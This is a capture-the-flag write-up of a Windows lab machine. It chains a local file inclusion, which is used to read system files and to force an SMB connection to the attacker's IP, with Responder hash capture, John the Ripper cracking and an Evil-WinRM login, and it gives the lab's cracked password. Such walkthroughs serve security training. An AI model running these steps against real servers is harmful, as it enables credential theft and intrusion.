# Responder Write-up

## Introduction

Windows is the most widely used operating system globally due to its user-friendly graphical interface. With approximately 85% market share, it becomes a critical OS to target. Most organizations use Active Directory to set up their Windows domain networks. Microsoft employs NTLM (New Technology LAN Manager) and Kerberos for authentication services. Despite known vulnerabilities, NTLM remains widely deployed to maintain compatibility with legacy clients and servers.

This lab focuses on exploiting a file inclusion vulnerability on a webpage served on a Windows machine to collect the NetNTLMv2 challenge of the user running the web server. We will use Responder to capture a NetNTLMv2 hash and John the Ripper to test millions of potential passwords.

## Enumeration

We begin by scanning the host for open ports and running services using Nmap:

```bash
nmap -p- --min-rate 1000 -sV 10.129.128.223
```

Nmap detects that the machine is running Windows with an Apache web server on port 80 and WinRM on port 5985.

## Website Enumeration

Accessing `http://[target ip]` redirects to `http://unika.htb`. We add an entry to the `/etc/hosts` file to resolve this domain:

```bash
echo "10.129.128.223 unika.htb" | sudo tee -a /etc/hosts
```

The website presents a web design business landing page with a language selection option. Changing the language reveals a potential Local File Inclusion (LFI) vulnerability via the `page` parameter.

## Exploiting the LFI Vulnerability

We test the LFI vulnerability by accessing common system files:

```bash
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

The contents of the `hosts` file are displayed, confirming the vulnerability.

## Capturing the Challenge with Responder

We exploit this vulnerability to include a file on our attacker machine via SMB, capturing the NetNTLMv2 hash. We use Responder to set up a malicious SMB server:

```bash
sudo responder -I tun0
```

Accessing the following URL forces the server to connect to our machine:

```bash
http://unika.htb/?page=//10.10.14.25/somefile
```

Responder captures the NetNTLMv2 hash of the Administrator user.

## Cracking the Hash

We use John the Ripper to crack the captured hash:

```bash
john -w=/usr/share/wordlists/rockyou.txt hash.txt
```

The password for the Administrator user is cracked: `badminton`.

## Connecting via WinRM

We use Evil-WinRM to connect to the WinRM service with the obtained credentials:

```bash
evil-winrm -i 10.129.136.91 -u administrator -p badminton
```

The flag is located in `C:\Users\mike\Desktop\flag.txt`.

Congratulations! You can now view the contents of the `flag.txt` file:

```bash
type C:\Users\mike\Desktop\flag.txt
```

---

